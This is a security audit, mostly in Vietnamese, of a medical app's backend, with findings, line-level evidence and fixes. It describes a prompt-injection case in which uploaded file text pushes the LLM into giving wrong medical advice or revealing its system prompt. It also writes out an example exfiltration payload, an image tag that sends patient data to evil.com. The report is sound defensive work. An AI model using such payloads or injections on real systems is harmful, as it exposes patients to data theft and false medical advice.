# 🔐 HealthLens — Runtime Security & Correctness Audit

> **Ngày**: 2026-06-01
> **Phạm vi**: Những lớp **runtime behavior** mà 6 review trước chưa cover — chủ yếu các lỗ hổng chỉ lộ khi app **chạy production**: prompt injection, multi-instance concurrency, soft-delete leaks, GDPR completeness, response shape consistency.
> **Phương pháp**: Mọi finding đã **verify trực tiếp trên code** (file path + line number + code snippet).

---

## 🎯 TL;DR — 10 finding mới

| # | Finding | Severity | Trạng thái |
|---|---------|:-:|------------|
| 1 | **LLM Prompt Injection** — user content nhét thẳng vào prompt | 🔴 Critical | NOT MITIGATED |
| 2 | **@Scheduled multi-instance duplication** — 3 jobs không có ShedLock | 🔴 Critical | NOT MITIGATED |
| 3 | **HTTP Security Response Headers** — không có CSP, HSTS, X-Frame-Options | 🔴 Critical | MISSING |
| 4 | **Soft Delete leak vectors** — 3 repo methods quên filter `deletedAt IS NULL` | 🟡 High | PARTIAL |
| 5 | **File Upload MIME spoofable** — chỉ check Content-Type header | 🟡 High | NOT MITIGATED |
| 6 | **GDPR completeness gaps** — Redis cache không purge, không export, không retention | 🟡 High | NOT MITIGATED |
| 7 | **API response envelope inconsistency** | 🟢 Medium | DESIGN ISSUE |
| 8 | **Side effect trong @Transactional(readOnly)** ở FollowUpReminderService | 🟢 Medium | PATTERN VIOLATION |
| 9 | **OcrController dùng raw Map** thay vì DTO với @Valid | 🟢 Low | MINOR |
| 10 | **Frontend Zod schemas mostly unused** — chỉ 12 instances `.parse()` | 🟢 Medium | UNDERUTILIZED |

---

## 1. 🤖 LLM Prompt Injection — 🔴 CRITICAL

### Bằng chứng

**`OcrService.java:632–677` (parseMetrics)**:
```java
String prompt = """
    ...
    OCR Text:
    """ + ocrText;  // ← User-uploaded file content concatenated raw
```

**`LlmService.java:519–559, 796–860`**:
```java
String basePrompt = promptTemplateRenderer.render(metricExplanationPromptTemplate, Map.of(
    "metricName", safeMetric(metricName),  // safeMetric() = chỉ .trim()
    "value", safeValue(value),
));
```
Tên `safe*` đánh lừa — chỉ trim whitespace.

**`LlmService.java:910–947`** (recommendations) và **`MetricExplanationRetrievalService.java:179–191`** (filter query) cũng pass user content unescaped.

Templates `metric-explanation.v3.txt` và `recommendations.v8-medical-disclaimer-vi.txt` dùng `{{placeholder}}` không có XML delimiter.

### Risk
Medical app → attacker craft file upload để LLM thay đổi recommendation → user nhận lời khuyên y tế sai. Có thể extract system prompt, DoS qua billing.

### Fix
- Wrap user content bằng XML delimiter
- Tạo `PromptSanitizer` regex detect instruction-break
- Đổi tên `safeMetric`→`trimMetric` (tránh false sense)
- Cap output tokens

---

## 2. ⏰ @Scheduled Multi-Instance Duplication — 🔴 CRITICAL

3 scheduled jobs chạy mà **không có distributed locking**:

| Job | File:Line | Cron | Hành vi |
|-----|-----------|------|---------|
| `FollowUpReminderScheduler.sendDueReminderEmails()` | `config/FollowUpReminderScheduler.java:27` | `0 0 * * * *` | Publish reminder email |
| `DeletionScheduler.processDeletionRequests()` | `config/DeletionScheduler.java:33` | `0 0 * * * *` | Xóa user data sau 72h |
| `MetricExplanationIngestionJob` | `service/MetricExplanationIngestionJob.java:15` | startup | Re-ingest RAG corpus |

`build.gradle.kts` KHÔNG có ShedLock dependency.

`DeletionScheduler` dùng `findNextDuePendingForUpdateSkipLocked()` → mỗi record xóa 1 lần dù invocation chạy N lần. **`FollowUpReminderService` KHÔNG có row-level lock** → reminder email sẽ gửi N lần trên N pods.

### Fix
Add ShedLock 5.16.0 + `@SchedulerLock(name="...", lockAtMostFor="55m")`.

---

## 3. 🛡️ HTTP Security Response Headers — 🔴 CRITICAL

**`SecurityConfig.java:63–107`** không gọi `.headers(...)`:

| Header | Status |
|--------|:-:|
| Content-Security-Policy | ❌ |
| Strict-Transport-Security | ❌ |
| X-Frame-Options | ❌ |
| X-Content-Type-Options | ❌ |
| Referrer-Policy | ❌ |
| Permissions-Policy | ❌ |

Medical app → no CSP + XSS bug → exfiltrate PHI qua `<img src="evil.com/?data=...">`.

### Fix
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; ..."))
    .httpStrictTransportSecurity(hsts -> hsts.includeSubDomains(true).maxAgeInSeconds(31536000))
    .frameOptions(frame -> frame.deny())
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

---

## 4. 🗑️ Soft Delete Leak — 🟡 HIGH

**`HealthRecord.java:77–78`** có `deletedAt` field nhưng **KHÔNG có** `@SQLDelete` / `@Where`.

**`HealthRecordRepository.java`**:
| Line | Method | Filter? |
|:-:|--------|:-:|
| 19 | `findByIdAndUserIdAndDeletedAtIsNull` | ✅ |
| **34** | `findAllByProfileIdAndUserId` | ❌ **LEAK** |
| **36** | `findAllByUserId` | ❌ **LEAK** |
| **38** | `findFileKeysByUserId` | ❌ **LEAK** |

### Fix
```java
@SQLDelete(sql = "UPDATE health_records SET deleted_at = NOW() WHERE id = ?")
@Where(clause = "deleted_at IS NULL")
public class HealthRecord { ... }
```

---

## 5. 📁 File Upload MIME Spoofable — 🟡 HIGH

**`HealthRecordService.java:1513–1523`** + **`OcrService.java:259`** + **`services/ocr-service/app.py:244–247`** — tất cả chỉ check Content-Type string, không magic-byte sniffing.

### Fix
Apache Tika 2.9.2 + `FileTypeVerifier.verify(byte[] header)` whitelist `image/jpeg, image/png, application/pdf`.

---

## 6. 📜 GDPR Completeness Gaps — 🟡 HIGH

### ✅ Account deletion implement đúng
`DataDeletionService.java:303–435` — purge HR records, profiles, shares, consent logs, anonymize user, delete S3 objects.

### ❌ 3 gap

1. **Redis cache không purge** — `LlmService.java:811` cache 7 ngày → sau deletion vẫn còn.
2. **Không có user data export** — chỉ admin export, không có `/users/me/export`.
3. **Không có retention policy** — health records 5+ năm vẫn còn.

---

## 7. 📦 Response Envelope Inconsistency — 🟢 MEDIUM

Error response ✅ consistent (RFC 7807 `ProblemDetail`).

Success response: 3 pattern khác nhau:
- `buildResponseBody(dto)` — helper shape không rõ
- `Map.of("data", ..., "pagination", ...)` — không type-safe
- Raw DTO

Pagination dùng cả Spring `Page<T>` và custom `PaginatedResponse<T>`.

---

## 8. 🔄 Side Effect trong @Transactional(readOnly) — 🟢 MEDIUM

**`FollowUpReminderService.java:69–71`**:
```java
@Transactional(readOnly = true)
public List<...> list(...) {
    var reminders = repository.findDue(...);
    dispatchDueReminderEmailsIfEnabled(userId);  // ← SIDE EFFECT!
    return reminders;
}
```

### Fix
Tách thành 2 method: `list()` readOnly và `dispatchDueReminders()` non-readOnly.

---

## 9. ⚠️ OcrController Raw Map — 🟢 LOW

**`OcrController.java:51`**:
```java
public ResponseEntity<OcrResult> extractText(@RequestBody Map<String, String> request) {
    String imageUrl = request.get("imageUrl");  // Manual validation
}
```

### Fix
Typed `OcrExtractRequest` record + `@Valid`.

---

## 10. 🌐 Frontend Zod Schemas Underutilized — 🟢 MEDIUM

`packages/shared/schemas/` có schemas (auth, profile, user) nhưng `grep ".parse(\|.safeParse(" apps/web/src` → chỉ **12 instances**, hầu hết trong test files.

Frontend rely vào backend `@Valid` → bad UX (round-trip để biết lỗi). Schemas declared nhưng unused → drift theo thời gian.

---

## 11. ✅ Verified-Good — Đừng fix nhầm

### 11.1 Presigned URL Authorization — IMPLEMENTED CORRECTLY
`HealthRecordService.java:391–401` → `loadAccessibleRecord()` (1664–1686) verify owner/share/access-level trước khi generate URL.

### 11.2 Path Traversal in Storage Keys — PREVENTED
`HealthRecordService.java:182–183` — mọi segment là UUID server-side, extension whitelist.

### 11.3 Redis Failure — IMPLEMENTED (fail-closed)
`LoginRateLimiter.java:44–49` configurable via `app.security.rate-limit-fail-closed`.

---

## 12. 📋 Priority Action Plan

### 🔴 P0 — Trong tuần này (~8h)

| # | Action | Effort | File |
|---|--------|:-:|------|
| 1 | HTTP security headers | 30m | `SecurityConfig.java:63` |
| 2 | ShedLock + annotate 3 jobs | 2h | `build.gradle.kts` + schedulers |
| 3 | `@SQLDelete` + `@Where` | 30m | `HealthRecord.java:77` |
| 4 | XML delimiter + PromptSanitizer | 3h | LLM templates + service |
| 5 | Redis cache purge | 1h | `DataDeletionService.java:303` |
| 6 | Tách side-effect khỏi readOnly tx | 30m | `FollowUpReminderService.java:69` |

### 🟡 P1 — Sprint tiếp (~12h)
7. Magic-byte file validation (Tika) — 2h
8. OcrController typed DTO — 15m
9. `/users/me/export` endpoint — 4h
10. Wire Zod schemas — 6h

### 🟢 P2 — Backlog
11. ApiResponse envelope chuẩn hóa — 6h
12. Data retention policy — 4h

---

## 13. 🎯 Tổng kết

3 finding nguy hiểm nhất:
1. **Prompt injection** — unique cho AI medical app
2. **@Scheduled duplication** — silent bug khi scale
3. **HTTP security headers** — 30 phút, bảo vệ PHI

Tổng P0: ~8h — đáng giá hơn refactor lớn ở Phase 4 master plan.

**Khuyến nghị**: Chèn P0 vào Phase 0 master plan, ưu tiên trước refactor enum/god service.

---

Sources:
- [OWASP Secure Headers](https://owasp.org/www-project-secure-headers/)
- [ShedLock](https://github.com/lukas-krecan/ShedLock)
- [Hibernate Soft Delete](https://docs.jboss.org/hibernate/orm/6.0/userguide/html_single/Hibernate_User_Guide.html#soft-delete)
- [Anthropic Prompt Injection Mitigations](https://docs.claude.com/en/docs/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks)
- [GDPR Article 20](https://gdpr-info.eu/art-20-gdpr/)
